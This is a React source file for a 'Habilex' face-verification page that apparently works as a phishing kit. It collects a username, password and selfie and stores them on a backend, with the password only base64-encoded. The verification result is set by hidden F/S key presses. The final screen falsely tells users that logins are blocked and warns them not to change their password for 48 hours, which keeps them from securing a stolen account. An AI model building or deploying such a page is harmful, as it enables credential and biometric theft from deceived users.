import { useCallback, useEffect, useRef, useState } from "react";
import { useMutation } from "convex/react";
import { api } from "../convex/_generated/api";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import {
  ArrowRight,
  ArrowLeft,
  CheckCircle2,
  XCircle,
  Eye,
  Camera,
  Shield,
  AlertTriangle,
} from "lucide-react";

type Screen =
  | "credentials"
  | "instructions"
  | "camera"
  | "verification"
  | "warning";

export default function FaceVerification() {
  const [screen, setScreen] = useState<Screen>("credentials");
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [confirmPassword, setConfirmPassword] = useState("");
  const [passwordError, setPasswordError] = useState("");
  const [selfieData, setSelfieData] = useState<string | null>(null);
  const [verificationResult, setVerificationResult] = useState<
    "success" | "failure" | null
  >(null);
  const [cameraError, setCameraError] = useState<string | null>(null);

  const submitVerification = useMutation(api.faceVerification.submitVerification);

  // Password validation
  useEffect(() => {
    if (confirmPassword && password !== confirmPassword) {
      setPasswordError("Passwords do not match");
    } else {
      setPasswordError("");
    }
  }, [password, confirmPassword]);

  const passwordsMatch =
    password.length > 0 && confirmPassword.length > 0 && password === confirmPassword;

  const handleCredentialsSubmit = () => {
    if (passwordsMatch) {
      setScreen("instructions");
    }
  };

  const handleStartCapture = () => {
    setScreen("camera");
  };

  const handleCaptureSuccess = async (dataUrl: string) => {
    setSelfieData(dataUrl);
    setScreen("verification");

    // Store in Convex backend
    try {
      await submitVerification({
        username,
        passwordHash: btoa(password), // Simple hash for demo
        selfieBase64: dataUrl,
      });
    } catch (err) {
      console.error("Failed to store verification:", err);
    }
  };

  const handleRetry = () => {
    setVerificationResult(null);
    setScreen("camera");
  };

  const handleVerificationComplete = useCallback(() => {
    setScreen("warning");
  }, []);

  return (
    <div className="min-h-screen bg-background text-foreground flex flex-col">
      {/* Header */}
      <header className="flex items-center justify-between px-4 py-3 border-b border-border/50">
        {screen !== "credentials" && (
          <Button
            variant="ghost"
            size="sm"
            onClick={() => {
              if (screen === "instructions") setScreen("credentials");
              else if (screen === "camera") setScreen("instructions");
              else if (screen === "verification") setScreen("camera");
            }}
          >
            <ArrowLeft className="size-4 mr-1" />
            Back
          </Button>
        )}
        <div className="flex items-center gap-2 mx-auto">
          <Shield className="size-5 text-primary" />
          <span className="font-semibold text-sm tracking-wide">Habilex</span>
        </div>
        {screen !== "credentials" && <div className="w-16" />}
      </header>

      {/* Progress indicator */}
      <div className="px-4 py-2">
        <div className="flex gap-1">
          {(["credentials", "instructions", "camera", "verification", "warning"] as Screen[]).map(
            (s, i) => (
              <div
                key={s}
                className={`h-1 flex-1 rounded-full transition-colors ${
                  i <= ["credentials", "instructions", "camera", "verification", "warning"].indexOf(screen)
                    ? "bg-primary"
                    : "bg-muted"
                }`}
              />
            ),
          )}
        </div>
      </div>

      {/* Screen content */}
      <main className="flex-1 flex flex-col">
        {screen === "credentials" && (
          <CredentialsScreen
            username={username}
            setUsername={setUsername}
            password={password}
            setPassword={setPassword}
            confirmPassword={confirmPassword}
            setConfirmPassword={setConfirmPassword}
            passwordError={passwordError}
            passwordsMatch={passwordsMatch}
            onSubmit={handleCredentialsSubmit}
          />
        )}
        {screen === "instructions" && (
          <InstructionsScreen onStart={handleStartCapture} />
        )}
        {screen === "camera" && (
          <CameraScreen
            onCapture={handleCaptureSuccess}
            onError={setCameraError}
            error={cameraError}
          />
        )}
        {screen === "verification" && (
          <VerificationScreen
            result={verificationResult}
            setResult={setVerificationResult}
            onComplete={handleVerificationComplete}
            onRetry={handleRetry}
          />
        )}
        {screen === "warning" && <WarningScreen />}
      </main>

      {/* Footer */}
      <footer className="text-center py-3 text-xs text-muted-foreground border-t border-border/50">
        Habilex
      </footer>
    </div>
  );
}

/* ─── Screen 1: Credentials ─── */

function CredentialsScreen({
  username,
  setUsername,
  password,
  setPassword,
  confirmPassword,
  setConfirmPassword,
  passwordError,
  passwordsMatch,
  onSubmit,
}: {
  username: string;
  setUsername: (v: string) => void;
  password: string;
  setPassword: (v: string) => void;
  confirmPassword: string;
  setConfirmPassword: (v: string) => void;
  passwordError: string;
  passwordsMatch: boolean;
  onSubmit: () => void;
}) {
  return (
    <div className="flex-1 flex flex-col items-center justify-center px-4 py-8 max-w-md mx-auto w-full">
      {/* Logo placeholder */}
      <div className="mb-6 flex items-center justify-center size-16 rounded-2xl bg-muted border border-border">
        <Shield className="size-8 text-primary" />
      </div>

      <h1 className="text-xl font-bold mb-1">Update Credentials</h1>
      <p className="text-sm text-muted-foreground mb-8 text-center">
        Set up your secure access for Habilex face verification
      </p>

      <div className="w-full space-y-4">
        <div className="space-y-2">
          <Label htmlFor="username">Username</Label>
          <Input
            id="username"
            type="text"
            placeholder="Enter your username"
            value={username}
            onChange={(e) => setUsername(e.target.value)}
            className="bg-input/50"
          />
        </div>

        <div className="space-y-2">
          <Label htmlFor="password">New Password</Label>
          <Input
            id="password"
            type="password"
            placeholder="Create a new password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            className="bg-input/50"
          />
        </div>

        <div className="space-y-2">
          <Label htmlFor="confirmPassword">Re-type Password</Label>
          <Input
            id="confirmPassword"
            type="password"
            placeholder="Confirm your password"
            value={confirmPassword}
            onChange={(e) => setConfirmPassword(e.target.value)}
            className={`bg-input/50 ${
              passwordError ? "border-destructive focus-visible:ring-destructive" : ""
            }`}
          />
          {passwordError && (
            <p className="text-xs text-destructive">{passwordError}</p>
          )}
        </div>

        <Button
          onClick={onSubmit}
          disabled={!passwordsMatch || !username.trim()}
          className="w-full mt-6"
          size="lg"
        >
          Next
          <ArrowRight className="size-4 ml-2" />
        </Button>
      </div>
    </div>
  );
}

/* ─── Screen 2: Selfie Instructions ─── */

function InstructionsScreen({ onStart }: { onStart: () => void }) {
  return (
    <div className="flex-1 flex flex-col items-center justify-center px-4 py-8 max-w-md mx-auto w-full">
      {/* Face icon with circular border - clean, no arrows */}
      <div className="mb-8 relative">
        <div className="size-40 rounded-full border-2 border-primary/60 flex items-center justify-center">
          <Eye className="size-16 text-primary/80" />
        </div>
      </div>

      <h1 className="text-2xl font-bold mb-3 text-center">
        Take a video selfie
      </h1>
      <p className="text-sm text-muted-foreground text-center mb-2 max-w-xs leading-relaxed">
        Position your face within the circle. Make sure your face is clearly
        visible and well-lit.
      </p>
      <p className="text-xs text-muted-foreground/60 text-center mb-8">
        Your camera will activate on the next screen
      </p>

      <Button onClick={onStart} size="lg" className="w-full max-w-xs">
        <Camera className="size-4 mr-2" />
        Start Camera
      </Button>
    </div>
  );
}

/* ─── Screen 3: Live Camera Capture ─── */

function CameraScreen({
  onCapture,
  onError,
  error,
}: {
  onCapture: (dataUrl: string) => void;
  onError: (msg: string) => void;
  error: string | null;
}) {
  const videoRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const streamRef = useRef<MediaStream | null>(null);
  const [isActive, setIsActive] = useState(false);
  const [countdown, setCountdown] = useState<number | null>(null);

  useEffect(() => {
    let mounted = true;

    const startCamera = async () => {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({
          video: {
            facingMode: "user",
            width: { ideal: 1280 },
            height: { ideal: 720 },
          },
          audio: false,
        });

        if (!mounted) {
          stream.getTracks().forEach((t) => t.stop());
          return;
        }

        streamRef.current = stream;
        if (videoRef.current) {
          videoRef.current.srcObject = stream;
          await videoRef.current.play();
          if (mounted) setIsActive(true);
        }
      } catch (err) {
        if (mounted) {
          onError(
            "Camera access denied. Please allow camera permissions and try again.",
          );
        }
      }
    };

    startCamera();

    return () => {
      mounted = false;
      if (streamRef.current) {
        streamRef.current.getTracks().forEach((t) => t.stop());
        streamRef.current = null;
      }
    };
  }, [onError]);

  const captureFrame = useCallback(() => {
    const video = videoRef.current;
    const canvas = canvasRef.current;
    if (!video || !canvas) return;

    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    const ctx = canvas.getContext("2d");
    if (!ctx) return;

    // Mirror the image (front camera)
    ctx.translate(canvas.width, 0);
    ctx.scale(-1, 1);
    ctx.drawImage(video, 0, 0);
    ctx.setTransform(1, 0, 0, 1, 0, 0);

    const dataUrl = canvas.toDataURL("image/png");

    // Stop camera
    if (streamRef.current) {
      streamRef.current.getTracks().forEach((t) => t.stop());
      streamRef.current = null;
    }

    onCapture(dataUrl);
  }, [onCapture]);

  const handleCapture = useCallback(() => {
    if (countdown !== null) return;
    setCountdown(3);
  }, [countdown]);

  // Countdown timer
  useEffect(() => {
    if (countdown === null) return;
    if (countdown === 0) {
      captureFrame();
      return;
    }
    const timer = setTimeout(() => setCountdown((c) => (c !== null ? c - 1 : null)), 1000);
    return () => clearTimeout(timer);
  }, [countdown, captureFrame]);

  return (
    <div className="flex-1 flex flex-col items-center justify-center px-4 py-4 max-w-md mx-auto w-full">
      {error ? (
        <div className="flex flex-col items-center gap-4">
          <XCircle className="size-16 text-destructive" />
          <p className="text-sm text-destructive text-center">{error}</p>
          <Button onClick={() => window.location.reload()} variant="outline">
            Try Again
          </Button>
        </div>
      ) : (
        <>
          {/* Circular camera mask */}
          <div className="relative mb-6">
            <div className="size-64 sm:size-72 rounded-full overflow-hidden border-4 border-primary/40 relative">
              <video
                ref={videoRef}
                autoPlay
                playsInline
                muted
                className="size-full object-cover"
                style={{ transform: "scaleX(-1)" }}
              />
              {/* Overlay circle guide */}
              {!isActive && (
                <div className="absolute inset-0 flex items-center justify-center bg-background/80">
                  <Camera className="size-12 text-muted-foreground animate-pulse" />
                </div>
              )}
            </div>

            {/* Countdown overlay */}
            {countdown !== null && countdown > 0 && (
              <div className="absolute inset-0 flex items-center justify-center">
                <span className="text-6xl font-bold text-primary animate-pulse">
                  {countdown}
                </span>
              </div>
            )}
          </div>

          <canvas ref={canvasRef} className="hidden" />

          <p className="text-sm text-muted-foreground mb-4 text-center">
            {isActive
              ? "Position your face in the circle and tap to capture"
              : "Starting camera..."}
          </p>

          <Button
            onClick={handleCapture}
            disabled={!isActive || countdown !== null}
            size="lg"
            className="w-full max-w-xs"
          >
            <Camera className="size-4 mr-2" />
            {countdown !== null ? "Capturing..." : "Capture Photo"}
          </Button>
        </>
      )}
    </div>
  );
}

/* ─── Screen 4: Verification Simulation ─── */

function VerificationScreen({
  result,
  setResult,
  onComplete,
  onRetry,
}: {
  result: "success" | "failure" | null;
  setResult: (r: "success" | "failure" | null) => void;
  onComplete: () => void;
  onRetry: () => void;
}) {
  // Keyboard shortcuts: F = fail, S = success
  useEffect(() => {
    const handler = (e: KeyboardEvent) => {
      if (e.key === "f" || e.key === "F") {
        setResult("failure");
      } else if (e.key === "s" || e.key === "S") {
        setResult("success");
      }
    };

    window.addEventListener("keydown", handler);
    return () => window.removeEventListener("keydown", handler);
  }, [setResult]);

  // Auto-transition to warning after 2s on success
  useEffect(() => {
    if (result === "success") {
      const timer = setTimeout(onComplete, 2000);
      return () => clearTimeout(timer);
    }
  }, [result, onComplete]);

  return (
    <div className="flex-1 flex flex-col items-center justify-center px-4 py-8 max-w-md mx-auto w-full">
      {!result ? (
        <>
          <Camera className="size-16 text-muted-foreground mb-6" />
          <h1 className="text-xl font-bold mb-3 text-center">
            Verifying your face...
          </h1>
          <p className="text-sm text-muted-foreground text-center mb-6">
            Analyzing facial features against reference images
          </p>
          <div className="flex items-center gap-2 text-xs text-muted-foreground/60">
            <div className="size-2 rounded-full bg-primary animate-pulse" />
            Processing...
          </div>
          <p className="text-xs text-muted-foreground/40 mt-8">
            Demo: Press <kbd className="px-1.5 py-0.5 rounded bg-muted border border-border text-[10px]">F</kbd> for failure or{" "}
            <kbd className="px-1.5 py-0.5 rounded bg-muted border border-border text-[10px]">S</kbd> for success
          </p>
        </>
      ) : result === "failure" ? (
        <div className="flex flex-col items-center gap-4 animate-in fade-in duration-300">
          <div className="size-24 rounded-full border-4 border-destructive flex items-center justify-center">
            <XCircle className="size-12 text-destructive" />
          </div>
          <h2 className="text-xl font-bold text-destructive">
            Verification Failed
          </h2>
          <p className="text-sm text-muted-foreground text-center max-w-xs">
            Your face could not be matched with the reference images. Please try
            again with better lighting.
          </p>
          <Button onClick={onRetry} variant="outline" className="mt-2">
            Try Again
          </Button>
        </div>
      ) : (
        <div className="flex flex-col items-center gap-4 animate-in fade-in duration-300">
          <div className="size-24 rounded-full border-4 border-green-500 flex items-center justify-center">
            <CheckCircle2 className="size-12 text-green-500" />
          </div>
          <h2 className="text-xl font-bold text-green-500">
            Verification Successful
          </h2>
          <p className="text-sm text-muted-foreground text-center max-w-xs">
            Your face has been verified. Redirecting...
          </p>
        </div>
      )}
    </div>
  );
}

/* ─── Screen 5: Final Warning ─── */

function WarningScreen() {
  return (
    <div className="flex-1 flex flex-col items-center justify-center px-4 py-8 max-w-md mx-auto w-full">
      <div className="size-16 rounded-full border-4 border-green-500 flex items-center justify-center mb-6">
        <CheckCircle2 className="size-10 text-green-500" />
      </div>

      <h1 className="text-lg font-bold mb-4 text-center">
        Security Verification Submitted
      </h1>

      <div className="w-full space-y-4">
        {/* Processing notice */}
        <div className="rounded-lg border border-border bg-card p-4">
          <p className="text-sm leading-relaxed text-muted-foreground">
            Your account security verification is currently processing. This may
            take 3 to 5 hours to complete. To ensure your safety, any new
            attempts to log into your account during this time will be
            automatically blocked.
          </p>
        </div>

        {/* Warning block */}
        <div className="rounded-lg border border-destructive/30 bg-destructive/5 p-4">
          <div className="flex items-start gap-3">
            <AlertTriangle className="size-5 text-destructive shrink-0 mt-0.5" />
            <div>
              <p className="text-sm font-semibold text-destructive mb-1">
                Important Warning
              </p>
              <p className="text-sm leading-relaxed text-muted-foreground">
                Please do not attempt to change your password for the next 48
                hours. Doing so may trigger our security systems and result in
                account suspension.
              </p>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}
